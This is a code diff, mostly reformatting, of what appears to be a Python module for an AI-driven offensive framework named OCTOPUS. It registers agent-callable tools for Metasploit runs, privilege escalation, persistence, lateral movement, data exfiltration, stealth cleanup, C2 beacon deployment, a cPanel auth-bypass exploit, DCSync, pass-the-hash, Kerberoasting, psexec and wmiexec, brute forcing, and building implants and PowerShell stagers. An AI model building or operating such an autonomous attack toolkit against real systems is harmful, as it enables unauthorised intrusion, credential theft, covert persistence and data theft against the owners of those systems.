     if credential is not None:
         return _finalize_msf_login_check_options(opts), credential, ""
-    return "", None, (
-        f"[!] MSF login check skipped: {module} requires registered credentials; "
-        "no typed service credential is available. Short check not run."
+    return (
+        "",
+        None,
+        (
+            f"[!] MSF login check skipped: {module} requires registered credentials; "
+            "no typed service credential is available. Short check not run."
+        ),
     )
 
 
@@ -1578,7 +1672,14 @@ def _run_full_killchain_credential_provider(
         return f"[!] Credential provider failed ({type(exc).__name__}): {message}"
     return sanitize_credential_result(credential, result)
 
-@tool(name="msf_run", aliases=["metasploit_run"], category="exploit", description="Run an active Metasploit module when explicitly enabled.", requires=["msfconsole"])
+
+@tool(
+    name="msf_run",
+    aliases=["metasploit_run"],
+    category="exploit",
+    description="Run an active Metasploit module when explicitly enabled.",
+    requires=["msfconsole"],
+)
 def ai_msf_run(target_ip: str, module: str = "", options: str = "") -> str:
     with contextlib.suppress(ImportError):
         pass
@@ -1592,12 +1693,20 @@ def ai_msf_run(target_ip: str, module: str = "", options: str = "") -> str:
     if not module:
         return "[!] msf_run requires target and module."
     from msf import run_msf_module
+
     opts = options or ""
     if "RHOSTS=" not in opts.upper():
         opts = f"RHOSTS={target_ip} {opts}".strip()
     return run_msf_module(module, opts, mode="run")
 
-@tool(name="killchain_privesc", aliases=["privesc"], category="post", description="Killchain Privilege Escalation", requires=["python:paramiko"])
+
+@tool(
+    name="killchain_privesc",
+    aliases=["privesc"],
+    category="post",
+    description="Killchain Privilege Escalation",
+    requires=["python:paramiko"],
+)
 def ai_privesc(target_ip: str, user: str | None = None, pwd: str | None = None) -> str:
     from core.killchain import run_privesc
 
@@ -1610,7 +1719,14 @@ def ai_privesc(target_ip: str, user: str | None = None, pwd: str | None = None) 
         killchain_stage="privesc",
     )
 
-@tool(name="killchain_persist", aliases=["persist", "persistence"], category="post", description="Killchain Persistence", requires=["python:paramiko"])
+
+@tool(
+    name="killchain_persist",
+    aliases=["persist", "persistence"],
+    category="post",
+    description="Killchain Persistence",
+    requires=["python:paramiko"],
+)
 def ai_persist(target_ip: str, user: str | None = None, pwd: str | None = None) -> str:
     from core.killchain import plant_persistence
 
@@ -1624,7 +1740,14 @@ def ai_persist(target_ip: str, user: str | None = None, pwd: str | None = None) 
         killchain_stage="persistence",
     )
 
-@tool(name="killchain_lateral", aliases=["lateral_move", "lateral"], category="post", description="Killchain Lateral Movement", requires=["python:paramiko"])
+
+@tool(
+    name="killchain_lateral",
+    aliases=["lateral_move", "lateral"],
+    category="post",
+    description="Killchain Lateral Movement",
+    requires=["python:paramiko"],
+)
 def ai_lateral(target_ip: str, user: str | None = None, pwd: str | None = None) -> str:
     from core.killchain import lateral_move
 
@@ -1638,7 +1761,14 @@ def ai_lateral(target_ip: str, user: str | None = None, pwd: str | None = None) 
         killchain_stage="lateral_movement",
     )
 
-@tool(name="killchain_exfil", aliases=["data_exfil", "exfil"], category="post", description="Killchain Data Exfiltration", requires=["python:paramiko"])
+
+@tool(
+    name="killchain_exfil",
+    aliases=["data_exfil", "exfil"],
+    category="post",
+    description="Killchain Data Exfiltration",
+    requires=["python:paramiko"],
+)
 def ai_exfil(target_ip: str, user: str | None = None, pwd: str | None = None) -> str:
     from core.killchain import data_exfil
 
@@ -1652,7 +1782,14 @@ def ai_exfil(target_ip: str, user: str | None = None, pwd: str | None = None) ->
         killchain_stage="data_exfil",
     )
 
-@tool(name="killchain_full", aliases=["full_killchain"], category="post", description="Run Full Killchain", requires=["python:paramiko"])
+
+@tool(
+    name="killchain_full",
+    aliases=["full_killchain"],
+    category="post",
+    description="Run Full Killchain",
+    requires=["python:paramiko"],
+)
 def ai_full_killchain(target_ip: str, user: str | None = None, pwd: str | None = None) -> str:
     from core.killchain import run_full_killchain
 
@@ -1664,7 +1801,14 @@ def ai_full_killchain(target_ip: str, user: str | None = None, pwd: str | None =
         missing_message=f"[!] Full killchain requires valid SSH credentials for {target_ip}.",
     )
 
-@tool(name="killchain_cleanup", aliases=["cleanup", "stealth_cleanup"], category="post", description="Stealth Cleanup", requires=["python:paramiko"])
+
+@tool(
+    name="killchain_cleanup",
+    aliases=["cleanup", "stealth_cleanup"],
+    category="post",
+    description="Stealth Cleanup",
+    requires=["python:paramiko"],
+)
 def ai_stealth_cleanup(target_ip: str, user: str | None = None, pwd: str | None = None) -> str:
     from core.killchain import stealth_cleanup
 
@@ -1678,7 +1822,14 @@ def ai_stealth_cleanup(target_ip: str, user: str | None = None, pwd: str | None 
         killchain_stage="cleanup",
     )
 
-@tool(name="deploy_c2_beacon", aliases=["c2_beacon"], category="post", description="Deploy C2 Beacon", requires=["python:paramiko"])
+
+@tool(
+    name="deploy_c2_beacon",
+    aliases=["c2_beacon"],
+    category="post",
+    description="Deploy C2 Beacon",
+    requires=["python:paramiko"],
+)
 def ai_deploy_c2_beacon(target_ip: str, user: str | None = None, pwd: str | None = None) -> str:
     from core.killchain import deploy_c2_beacon
 
@@ -1690,7 +1841,13 @@ def ai_deploy_c2_beacon(target_ip: str, user: str | None = None, pwd: str | None
         missing_message=f"[!] C2 beacon deployment requires valid SSH credentials for {target_ip}.",
     )
 
-@tool(name="cpanel_exploit", aliases=["cve_2026_41940", "cpanel_auth_bypass"], category="post", description="CVE-2026-41940 cPanel Exploit")
+
+@tool(
+    name="cpanel_exploit",
+    aliases=["cve_2026_41940", "cpanel_auth_bypass"],
+    category="post",
+    description="CVE-2026-41940 cPanel Exploit",
+)
 def ai_cpanel_exploit(target: str, action: str = "cmd", cmd_arg: str = "id") -> str:
     try:
         import json as _json
@@ -1720,15 +1877,28 @@ def ai_cpanel_exploit(target: str, action: str = "cmd", cmd_arg: str = "id") -> 
     except Exception as e:
         return f"[!] cPanel exploit error: {e}"
 
-@tool(name="shodan", aliases=["shodan_search", "shodan_host", "shodan_vulns", "shodan_range"], category="recon", description="Shodan OSINT tool")
+
+@tool(
+    name="shodan",
+    aliases=["shodan_search", "shodan_host", "shodan_vulns", "shodan_range"],
+    category="recon",
+    description="Shodan OSINT tool",
+)
 def ai_shodan_smart(query: str) -> str:
     try:
         from shodan_module import run_shodan_smart
+
         return run_shodan_smart(query)
     except ImportError:
         return "[!] shodan_module.py not found."
 
-@tool(name="browser_surface_analysis", aliases=["browser_analyze", "browser_surface", "shardbrowser_browse"], category="recon", description="Render and summarize a target page with ShardBrowser, with HTTP fallback.")
+
+@tool(
+    name="browser_surface_analysis",
+    aliases=["browser_analyze", "browser_surface", "shardbrowser_browse"],
+    category="recon",
+    description="Render and summarize a target page with ShardBrowser, with HTTP fallback.",
+)
 def ai_browser_surface_analysis(target: str, proto: str = "https", port: str = "", wait: float = 5) -> str:
     url = _build_browser_url(target, proto=proto, port=port)
     rendered = _run_shardbrowser_direct(url, proto=proto, port=port, wait=wait, headless=True)
@@ -1744,7 +1914,14 @@ def ai_browser_surface_analysis(target: str, proto: str = "https", port: str = "
         f"{fallback}"
     )
 
-@tool(name="shardbrowser_osint", aliases=["browser_osint", "shard_osint", "shardbrowser"], category="recon", description="Run isolated ShardBrowser OSINT searches.", requires=["octopus:shardbrowser"])
+
+@tool(
+    name="shardbrowser_osint",
+    aliases=["browser_osint", "shard_osint", "shardbrowser"],
+    category="recon",
+    description="Run isolated ShardBrowser OSINT searches.",
+    requires=["octopus:shardbrowser"],
+)
 def ai_shardbrowser_osint(query: str, engines: str = "", proxy: str = "") -> str:
     try:
         import json as _json
@@ -1756,8 +1933,10 @@ def ai_shardbrowser_osint(query: str, engines: str = "", proxy: str = "") -> str
     sb = ShardBrowser()
     status = sb.get_status()
     if not status.get("installed"):
-        return (f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
-                "Install deps: pip install httpx[socks] patchright")
+        return (
+            f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
+            "Install deps: pip install httpx[socks] patchright"
+        )
 
     engine_list = [e.strip() for e in engines.split(",") if e.strip()] if engines else None
     try:
@@ -1766,19 +1945,25 @@ def ai_shardbrowser_osint(query: str, engines: str = "", proxy: str = "") -> str
     except Exception as e:
         return f"[!] ShardX OSINT failed: {e}"
 
-@tool(name="crack_hashes", aliases=["hash_crack", "crack", "hashcrack"], category="post", description="Hash Cracker", requires=["any:hashcat,john"])
+
+@tool(
+    name="crack_hashes",
+    aliases=["hash_crack", "crack", "hashcrack"],
+    category="post",
+    description="Hash Cracker",
+    requires=["any:hashcat,john"],
+)
 def ai_crack_hashes(target: str) -> str:
     try:
         from hash_cracker import run_crack_hashes
+
         candidates = _candidate_hash_files_for_target(target)
         if candidates:
             selected = candidates[0]
             output = run_crack_hashes(selected)
             registered = _register_cracked_pairs_from_output(output, target)
             return (
-                f"[*] Auto-selected hash input: {selected}\n"
-                f"[*] Cracked credentials registered: {registered}\n"
-                f"{output}"
+                f"[*] Auto-selected hash input: {selected}\n[*] Cracked credentials registered: {registered}\n{output}"
             )
         output = run_crack_hashes(target)
         registered = _register_cracked_pairs_from_output(output, target)
@@ -1830,10 +2015,12 @@ def _postgres_inventory(host: str, port: int, user: str, password: str) -> dict:
     driver = None
     try:
         import psycopg2 as driver
+
         api = "psycopg2"
     except ImportError:
         try:
             import psycopg as driver
+
             api = "psycopg"
         except ImportError:
             return {"error": "postgres driver unavailable: install psycopg2 or psycopg"}
@@ -1842,14 +2029,23 @@ def _postgres_inventory(host: str, port: int, user: str, password: str) -> dict:
     try:
         if api == "psycopg2":
             conn = driver.connect(
-                host=host, port=int(port), user=user, password=password,
-                dbname="postgres", connect_timeout=8,
+                host=host,
+                port=int(port),
+                user=user,
+                password=password,
+                dbname="postgres",
+                connect_timeout=8,
             )
             conn.set_session(readonly=True, autocommit=True)
         else:
             conn = driver.connect(
-                host=host, port=int(port), user=user, password=password,
-                dbname="postgres", connect_timeout=8, autocommit=True,
+                host=host,
+                port=int(port),
+                user=user,
+                password=password,
+                dbname="postgres",
+                connect_timeout=8,
+                autocommit=True,
             )
         cur = conn.cursor()
         cur.execute("SELECT version()")
@@ -1875,10 +2071,12 @@ def _mysql_inventory(host: str, port: int, user: str, password: str) -> dict:
     api = ""
     try:
         import pymysql as driver
+
         api = "pymysql"
     except ImportError:
         try:
             import mysql.connector as driver
+
             api = "mysql.connector"
         except ImportError:
             return {"error": "mysql driver unavailable: install pymysql or mysql-connector-python"}
@@ -1887,14 +2085,23 @@ def _mysql_inventory(host: str, port: int, user: str, password: str) -> dict:
     try:
         if api == "pymysql":
             conn = driver.connect(
-                host=host, port=int(port), user=user, password=password,
-                database="information_schema", connect_timeout=8,
-                read_timeout=8, write_timeout=8,
+                host=host,
+                port=int(port),
+                user=user,
+                password=password,
+                database="information_schema",
+                connect_timeout=8,
+                read_timeout=8,
+                write_timeout=8,
             )
         else:
             conn = driver.connect(
-                host=host, port=int(port), user=user, password=password,
-                database="information_schema", connection_timeout=8,
+                host=host,
+                port=int(port),
+                user=user,
+                password=password,
+                database="information_schema",
+                connection_timeout=8,
             )
         cur = conn.cursor()
         cur.execute("SELECT VERSION()")
@@ -1915,7 +2122,12 @@ def _mysql_inventory(host: str, port: int, user: str, password: str) -> dict:
                 logging.debug("Suppressed mysql close error: %s", exc)
 
 
-@tool(name="db_inventory", aliases=["database_inventory"], category="post", description="Read-only database inventory using known credentials.")
+@tool(
+    name="db_inventory",
+    aliases=["database_inventory"],
+    category="post",
+    description="Read-only database inventory using known credentials.",
+)
 def ai_db_inventory(host: str, port: int = 0, service: str = "") -> str:
     """Inventory a DB only with already known credentials. No credential guessing."""
     host = _db_clean_host(host)
@@ -1962,8 +2174,7 @@ def ai_db_inventory(host: str, port: int = 0, service: str = "") -> str:
                     )
             if isinstance(result.get("databases"), list):
                 result["databases"] = [
-                    sanitize_credential_text(item, material.password)
-                    for item in result["databases"]
+                    sanitize_credential_text(item, material.password) for item in result["databases"]
                 ]
         if result.get("error"):
             last_error = result["error"]
@@ -1973,9 +2184,7 @@ def ai_db_inventory(host: str, port: int = 0, service: str = "") -> str:
         databases = result.get("databases", [])
         output.append(f"DB inventory completed: {service}")
         output.append(f"Version: {str(result.get('version', 'unknown'))[:220]}")
-        output.append(
-            f"Current user: {result.get('current_user', credential.username)}"
-        )
+        output.append(f"Current user: {result.get('current_user', credential.username)}")
         output.append(f"Databases ({len(databases)}):")
         for database in databases[:30]:
             output.append(f"  {database}")
@@ -1986,7 +2195,14 @@ def ai_db_inventory(host: str, port: int = 0, service: str = "") -> str:
         output.append(f"Last error: {last_error}")
     return "\n".join(output)
 
-@tool(name="ssh_session", aliases=["ssh-session", "sshsession"], category="post", description="Post-exploitation SSH Session", requires=["python:paramiko"])
+
+@tool(
+    name="ssh_session",
+    aliases=["ssh-session", "sshsession"],
+    category="post",
+    description="Post-exploitation SSH Session",
+    requires=["python:paramiko"],
+)
 def ai_ssh_session(host: str, user: str | None = None, pwd: str | None = None, port: int = 22) -> str:
     credential, error = _resolve_ai_creds(host, user, pwd, port=port)
     if credential is None:
@@ -2003,7 +2219,14 @@ def ai_ssh_session(host: str, user: str | None = None, pwd: str | None = None, p
         ),
     )
 
-@tool(name="ssh_inventory", aliases=["post_access_inventory", "controlled_ssh_inventory", "ssh_survey"], category="post", description="Controlled SSH post-access inventory", requires=["python:paramiko"])
+
+@tool(
+    name="ssh_inventory",
+    aliases=["post_access_inventory", "controlled_ssh_inventory", "ssh_survey"],
+    category="post",
+    description="Controlled SSH post-access inventory",
+    requires=["python:paramiko"],
+)
 def ai_ssh_inventory(host: str, user: str | None = None, pwd: str | None = None, port: int = 22) -> str:
     credential, _error = _resolve_ai_creds(
         host,
@@ -2021,7 +2244,14 @@ def ai_ssh_inventory(host: str, user: str | None = None, pwd: str | None = None,
         port=port,
     )
 
-@tool(name="ssh_exec", aliases=["ssh-exec", "remote_exec"], category="post", description="Run a command through SSH using known or supplied credentials.", requires=["python:paramiko"])
+
+@tool(
+    name="ssh_exec",
+    aliases=["ssh-exec", "remote_exec"],
+    category="post",
+    description="Run a command through SSH using known or supplied credentials.",
+    requires=["python:paramiko"],
+)
 def ai_ssh_exec(host: str, user: str | None = None, pwd: str | None = None, command: str = "", port: int = 22) -> str:
     command = _strip_wrapping_quotes(command)
     block_reason = _ssh_exec_block_reason(command)
@@ -2052,9 +2282,17 @@ def ai_ssh_exec(host: str, user: str | None = None, pwd: str | None = None, comm
             except Exception as _exc:
                 logging.debug(f"Suppressed in post_tools.py: {_exc}")
 
-@tool(name="ad_enum", aliases=["ad_enumerate"], category="post", description="Active Directory enumeration", requires=["any:python:impacket.ldap,python:ldap3,ldapsearch,enum4linux,rpcclient,bloodhound-python,bloodhound.py"])
+
+@tool(
+    name="ad_enum",
+    aliases=["ad_enumerate"],
+    category="post",
+    description="Active Directory enumeration",
+    requires=["any:python:impacket.ldap,python:ldap3,ldapsearch,enum4linux,rpcclient,bloodhound-python,bloodhound.py"],
+)
 def ai_ad_enum(target_ip: str, user: str | None = None, pwd: str | None = None, domain: str = "") -> str:
     from core.killchain.ad.enumeration import run_ad_enum
+
     with _ad_creds_for_execution(target_ip, user, pwd, domain) as (creds, error):
         if error:
             return error
@@ -2063,9 +2301,17 @@ def ai_ad_enum(target_ip: str, user: str | None = None, pwd: str | None = None, 
             lambda: run_ad_enum(target_ip, creds=creds),
         )
 
-@tool(name="bloodhound_ingest", aliases=["bloodhound", "sharphound_ingest"], category="post", description="Collect BloodHound relationship data with known domain credentials", requires=["any:python:bloodhound,bloodhound-python,bloodhound.py"])
+
+@tool(
+    name="bloodhound_ingest",
+    aliases=["bloodhound", "sharphound_ingest"],
+    category="post",
+    description="Collect BloodHound relationship data with known domain credentials",
+    requires=["any:python:bloodhound,bloodhound-python,bloodhound.py"],
+)
 def ai_bloodhound_ingest(target_ip: str, user: str | None = None, pwd: str | None = None, domain: str = "") -> str:
     from core.killchain.ad.enumeration import bloodhound_ingest
+
     with _ad_creds_for_execution(target_ip, user, pwd, domain) as (creds, error):
         if error:
             return error
@@ -2076,9 +2322,17 @@ def ai_bloodhound_ingest(target_ip: str, user: str | None = None, pwd: str | Non
             lambda: bloodhound_ingest(target_ip, creds),
         )
 
-@tool(name="gpo_review", aliases=["gpo"], category="post", description="Review Group Policy Objects through LDAP with known domain context", requires=["any:python:impacket.ldap,python:ldap3,ldapsearch"])
+
+@tool(
+    name="gpo_review",
+    aliases=["gpo"],
+    category="post",
+    description="Review Group Policy Objects through LDAP with known domain context",
+    requires=["any:python:impacket.ldap,python:ldap3,ldapsearch"],
+)
 def ai_gpo_review(target_ip: str, user: str | None = None, pwd: str | None = None, domain: str = "") -> str:
     from core.killchain.ad.enumeration import enumerate_gpo
+
     with _ad_creds_for_execution(target_ip, user, pwd, domain) as (creds, error):
         if error:
             return error
@@ -2089,7 +2343,14 @@ def ai_gpo_review(target_ip: str, user: str | None = None, pwd: str | None = Non
             lambda: enumerate_gpo(target_ip, creds),
         )
 
-@tool(name="adcs_review", aliases=["adcs", "certipy_find"], category="post", description="Read-only ADCS template review with Certipy find", requires=["any:certipy,certipy-ad"])
+
+@tool(
+    name="adcs_review",
+    aliases=["adcs", "certipy_find"],
+    category="post",
+    description="Read-only ADCS template review with Certipy find",
+    requires=["any:certipy,certipy-ad"],
+)
 def ai_adcs_review(target_ip: str, user: str | None = None, pwd: str | None = None, domain: str = "") -> str:
     certipy_bin = shutil.which("certipy") or shutil.which("certipy-ad")
     if not certipy_bin:
@@ -2101,10 +2362,14 @@ def ai_adcs_review(target_ip: str, user: str | None = None, pwd: str | None = No
             return "[AD SECURITY REVIEW]\n[ADCS] Certipy find requires domain credentials."
         user_at_domain = f"{creds['user']}@{creds['domain']}"
         cmd = [
-            certipy_bin, "find",
-            "-u", user_at_domain,
-            "-p", creds.get("password", ""),
-            "-dc-ip", target_ip,
+            certipy_bin,
+            "find",
+            "-u",
+            user_at_domain,
+            "-p",
+            creds.get("password", ""),
+            "-dc-ip",
+            target_ip,
             "-stdout",
             "-enabled",
         ]
@@ -2113,9 +2378,17 @@ def ai_adcs_review(target_ip: str, user: str | None = None, pwd: str | None = No
             lambda: run_tool(cmd, timeout=240),
         )
 
-@tool(name="asrep_roast", aliases=["asrep"], category="post", description="AS-REP roasting", requires=["any:python:impacket.examples.GetNPUsers,GetNPUsers.py,impacket-GetNPUsers"])
+
+@tool(
+    name="asrep_roast",
+    aliases=["asrep"],
+    category="post",
+    description="AS-REP roasting",
+    requires=["any:python:impacket.examples.GetNPUsers,GetNPUsers.py,impacket-GetNPUsers"],
+)
 def ai_asrep_roast(target_ip: str, user: str | None = None, pwd: str | None = None, domain: str = "") -> str:
     from core.killchain.ad.kerberos import asrep_roast
+
     with _ad_creds_for_execution(target_ip, user, pwd, domain) as (creds, error):
         if error:
             return error
@@ -2127,9 +2400,17 @@ def ai_asrep_roast(target_ip: str, user: str | None = None, pwd: str | None = No
             ),
         )
 
-@tool(name="kerberoast", aliases=["kerberoasting"], category="post", description="Kerberoasting", requires=["any:python:impacket.examples.GetUserSPNs,GetUserSPNs.py,impacket-GetUserSPNs"])
+
+@tool(
+    name="kerberoast",
+    aliases=["kerberoasting"],
+    category="post",
+    description="Kerberoasting",
+    requires=["any:python:impacket.examples.GetUserSPNs,GetUserSPNs.py,impacket-GetUserSPNs"],
+)
 def ai_kerberoast(target_ip: str, user: str | None = None, pwd: str | None = None, domain: str = "") -> str:
     from core.killchain.ad.kerberos import kerberoast
+
     with _ad_creds_for_execution(target_ip, user, pwd, domain) as (creds, error):
         if error:
             return error
@@ -2140,9 +2421,17 @@ def ai_kerberoast(target_ip: str, user: str | None = None, pwd: str | None = Non
             lambda: kerberoast(target_ip, creds),
         )
 
-@tool(name="dcsync", aliases=["dc_sync"], category="post", description="DCSync with domain credentials", requires=["any:python:impacket.examples.secretsdump,secretsdump.py,impacket-secretsdump"])
+
+@tool(
+    name="dcsync",
+    aliases=["dc_sync"],
+    category="post",
+    description="DCSync with domain credentials",
+    requires=["any:python:impacket.examples.secretsdump,secretsdump.py,impacket-secretsdump"],
+)
 def ai_dcsync(target_ip: str, user: str | None = None, pwd: str | None = None, domain: str = "") -> str:
     from core.killchain.ad.credential import dcsync
+
     with _ad_creds_for_execution(target_ip, user, pwd, domain) as (creds, error):
         if error:
             return error
@@ -2153,17 +2442,38 @@ def ai_dcsync(target_ip: str, user: str | None = None, pwd: str | None = None, d
             lambda: dcsync(target_ip, creds),
         )
 
-@tool(name="pass_the_hash", aliases=["pth"], category="post", description="Pass-the-Hash authentication", requires=["any:python:impacket.smbconnection,smbexec.py,impacket-smbexec,wmiexec.py,impacket-wmiexec"])
+
+@tool(
+    name="pass_the_hash",
+    aliases=["pth"],
+    category="post",
+    description="Pass-the-Hash authentication",
+    requires=["any:python:impacket.smbconnection,smbexec.py,impacket-smbexec,wmiexec.py,impacket-wmiexec"],
+)
 def ai_pass_the_hash(target_ip: str, user: str = "", nthash: str = "", domain: str = "") -> str:
     if not user or not nthash:
         return "[!] Pass-the-Hash requires target, user and NT hash."
     from core.killchain.ad.credential import pass_the_hash
+
     return pass_the_hash(target_ip, user, nthash, domain=domain or "")
 
-@tool(name="psexec", aliases=["ps_exec"], category="post", description="PsExec lateral movement", requires=["any:python:impacket.examples.psexec,psexec.py,impacket-psexec"])
-def ai_psexec(target_ip: str, user: str | None = None, pwd: str | None = None,
-              domain: str = "", command: str = "whoami && hostname && ipconfig") -> str:
+
+@tool(
+    name="psexec",
+    aliases=["ps_exec"],
+    category="post",
+    description="PsExec lateral movement",
+    requires=["any:python:impacket.examples.psexec,psexec.py,impacket-psexec"],
+)
+def ai_psexec(
+    target_ip: str,
+    user: str | None = None,
+    pwd: str | None = None,
+    domain: str = "",
+    command: str = "whoami && hostname && ipconfig",
+) -> str:
     from core.killchain.ad.lateral import psexec
+
     with _ad_creds_for_execution(target_ip, user, pwd, domain) as (creds, error):
         if error:
             return error
@@ -2178,10 +2488,23 @@ def ai_psexec(target_ip: str, user: str | None = None, pwd: str | None = None,
             ),
         )
 
-@tool(name="wmiexec", aliases=["wmi_exec"], category="post", description="WMIExec lateral movement", requires=["any:python:impacket.examples.wmiexec,wmiexec.py,impacket-wmiexec"])
-def ai_wmiexec(target_ip: str, user: str | None = None, pwd: str | None = None,
-               domain: str = "", command: str = "whoami && hostname && ipconfig") -> str:
+
+@tool(
+    name="wmiexec",
+    aliases=["wmi_exec"],
+    category="post",
+    description="WMIExec lateral movement",
+    requires=["any:python:impacket.examples.wmiexec,wmiexec.py,impacket-wmiexec"],
+)
+def ai_wmiexec(
+    target_ip: str,
+    user: str | None = None,
+    pwd: str | None = None,
+    domain: str = "",
+    command: str = "whoami && hostname && ipconfig",
+) -> str:
     from core.killchain.ad.lateral import wmiexec
+
     with _ad_creds_for_execution(target_ip, user, pwd, domain) as (creds, error):
         if error:
             return error
@@ -2196,15 +2519,21 @@ def ai_wmiexec(target_ip: str, user: str | None = None, pwd: str | None = None,
             ),
         )
 
-@tool(name="socks_proxy", aliases=["socks"], category="post", description="Start a SOCKS proxy through SSH", requires=["python:paramiko"])
+
+@tool(
+    name="socks_proxy",
+    aliases=["socks"],
+    category="post",
+    description="Start a SOCKS proxy through SSH",
+    requires=["python:paramiko"],
+)
 def ai_socks_proxy(target_ip: str, user: str | None = None, pwd: str | None = None, local_port: int = 1080) -> str:
-    client, _user, _pwd, err = _connect_ssh_for_tool(
-        target_ip, user, pwd, prefer_privileged=True
-    )
+    client, _user, _pwd, err = _connect_ssh_for_tool(target_ip, user, pwd, prefer_privileged=True)
     if err:
         return err
     try:
         from core.killchain.pivot import setup_socks_proxy
+
         result = setup_socks_proxy(client, local_port=int(local_port))
         _PIVOT_SSH_CLIENTS.append(client)
         return result
@@ -2212,22 +2541,33 @@ def ai_socks_proxy(target_ip: str, user: str | None = None, pwd: str | None = No
         client.close()
         raise
 
-@tool(name="port_forward", aliases=["local_forward"], category="post", description="Create a local SSH port forward", requires=["python:paramiko"])
-def ai_port_forward(target_ip: str, local_port: int = 8080,
-                    remote_host: str = "127.0.0.1", remote_port: int = 80,
-                    user: str | None = None, pwd: str | None = None) -> str:
+
+@tool(
+    name="port_forward",
+    aliases=["local_forward"],
+    category="post",
+    description="Create a local SSH port forward",
+    requires=["python:paramiko"],
+)
+def ai_port_forward(
+    target_ip: str,
+    local_port: int = 8080,
+    remote_host: str = "127.0.0.1",
+    remote_port: int = 80,
+    user: str | None = None,
+    pwd: str | None = None,
+) -> str:
     if isinstance(remote_host, str) and ":" in remote_host and int(remote_port) == 80:
         host_part, port_part = remote_host.rsplit(":", 1)
         if port_part.isdigit():
             remote_host = host_part
             remote_port = int(port_part)
-    client, _user, _pwd, err = _connect_ssh_for_tool(
-        target_ip, user, pwd, prefer_privileged=True
-    )
+    client, _user, _pwd, err = _connect_ssh_for_tool(target_ip, user, pwd, prefer_privileged=True)
     if err:
         return err
     try:
         from core.killchain.pivot import setup_local_forward
+
         result = setup_local_forward(client, int(local_port), remote_host, int(remote_port))
         _PIVOT_SSH_CLIENTS.append(client)
         return result
@@ -2235,29 +2575,40 @@ def ai_port_forward(target_ip: str, local_port: int = 8080,
         client.close()
         raise
 
-@tool(name="network_recon", aliases=["pivot_netinfo"], category="post", description="Discover internal networks through SSH", requires=["python:paramiko"])
+
+@tool(
+    name="network_recon",
+    aliases=["pivot_netinfo"],
+    category="post",
+    description="Discover internal networks through SSH",
+    requires=["python:paramiko"],
+)
 def ai_network_recon(target_ip: str, user: str | None = None, pwd: str | None = None) -> str:
-    client, _user, _pwd, err = _connect_ssh_for_tool(
-        target_ip, user, pwd, prefer_privileged=True
-    )
+    client, _user, _pwd, err = _connect_ssh_for_tool(target_ip, user, pwd, prefer_privileged=True)
     if err:
         return err
     try:
         from core.killchain.pivot import get_network_info
+
         return get_network_info(client)
     finally:
         client.close()
 
 
-@tool(name="internal_service_probe", aliases=["internal_services_probe"], category="post", description="Short internal TCP service probe through SSH", requires=["python:paramiko"])
+@tool(
+    name="internal_service_probe",
+    aliases=["internal_services_probe"],
+    category="post",
+    description="Short internal TCP service probe through SSH",
+    requires=["python:paramiko"],
+)
 def ai_internal_service_probe(target_ip: str, user: str | None = None, pwd: str | None = None) -> str:
-    client, _user, _pwd, err = _connect_ssh_for_tool(
-        target_ip, user, pwd, prefer_privileged=True
-    )
+    client, _user, _pwd, err = _connect_ssh_for_tool(target_ip, user, pwd, prefer_privileged=True)
     if err:
         return err
     try:
         from core.killchain.ssh_helpers import _ssh_exec
+
         ports = "22 25 53 80 443 445 3306 5432 6379 8000 8080 8443 9000"
         script = r"""
 hosts="$(
@@ -2296,45 +2647,82 @@ echo "Internal services discovered: $count"
     finally:
         client.close()
 
-@tool(name="stealth_brute", aliases=["stealth_bruteforce"], category="exploit", description="Alias for the built-in adaptive bruteforce tool")
+
+@tool(
+    name="stealth_brute",
+    aliases=["stealth_bruteforce"],
+    category="exploit",
+    description="Alias for the built-in adaptive bruteforce tool",
+)
 def ai_stealth_brute(service: str, target: str) -> str:
     from core.tools.exploit_tools import run_bruteforce
+
     return run_bruteforce(service, target)
 
-@tool(name="build_go_implant", aliases=["build_go"], category="post", description="Build the Go C2 implant", requires=["go", "garble"])
-def ai_build_go_implant(c2_url: str = "http://127.0.0.1:8443",
-                        os_target: str = "linux", arch_target: str = "amd64") -> str:
+
+@tool(
+    name="build_go_implant",
+    aliases=["build_go"],
+    category="post",
+    description="Build the Go C2 implant",
+    requires=["go", "garble"],
+)
+def ai_build_go_implant(
+    c2_url: str = "http://127.0.0.1:8443", os_target: str = "linux", arch_target: str = "amd64"
+) -> str:
     try:
         from core.c2.builder import build_implant
+
         result = build_implant(os_target=os_target, arch_target=arch_target, c2_urls=c2_url)
         return result or "[+] Go implant build finished."
     except SystemExit as e:
         return f"[!] Go implant build aborted: {e}"
 
-@tool(name="build_python_implant", aliases=["build_py_implant"], category="post", description="Generate the Python C2 implant")
-def ai_build_python_implant(c2_url: str = "http://127.0.0.1:8443",
-                            beacon_interval: int = 60) -> str:
+
+@tool(
+    name="build_python_implant",
+    aliases=["build_py_implant"],
+    category="post",
+    description="Generate the Python C2 implant",
+)
+def ai_build_python_implant(c2_url: str = "http://127.0.0.1:8443", beacon_interval: int = 60) -> str:
     from core.c2.implants.python_implant import generate_python_implant
+
     code = generate_python_implant(c2_urls=[c2_url], beacon_interval=int(beacon_interval))
     path = _write_generated_artifact("implant_python.py", code)
     return f"[+] Python implant generated: {path}\nSize: {len(code)} bytes\nC2: {c2_url}"
 
-@tool(name="build_ps_stager", aliases=["build_powershell_stager"], category="post", description="Generate a PowerShell C2 stager")
+
+@tool(
+    name="build_ps_stager",
+    aliases=["build_powershell_stager"],
+    category="post",
+    description="Generate a PowerShell C2 stager",
+)
 def ai_build_ps_stager(c2_url: str = "http://127.0.0.1:8443", method: str = "iex") -> str:
     from core.c2.implants.powershell_stager import generate_ps_encoded, generate_ps_stager
+
     code = generate_ps_encoded(c2_url) if method == "encoded" else generate_ps_stager(c2_url, method=method)
     path = _write_generated_artifact("stager.ps1", code)
     return f"[+] PowerShell stager generated: {path}\nC2: {c2_url}"
+
 
 @tool(name="waf_detect", aliases=["detect_waf", "waf"], category="recon", description="Detect WAF/Firewall")
 def ai_waf_detect(target_ip: str) -> str:
     return _run_waf_detect(target_ip)
 
+
 @tool(name="searchsploit", category="recon", description="Search exploit-db", requires=["searchsploit"])
 def ai_searchsploit(query: str) -> str:
     return run_tool(["searchsploit", "--color", *query.split()], timeout=60)
 
-@tool(name="plugin", aliases=["run_plugin", "octopus_plugin"], category="util", description="Run a class-based OCTOPUS plugin by name.")
+
+@tool(
+    name="plugin",
+    aliases=["run_plugin", "octopus_plugin"],
+    category="util",
+    description="Run a class-based OCTOPUS plugin by name.",
+)
 def ai_run_plugin(plugin_name: str, target: str = "", action: str = "scan") -> str:
     """Execute PluginManager plugins through the tool registry.
 
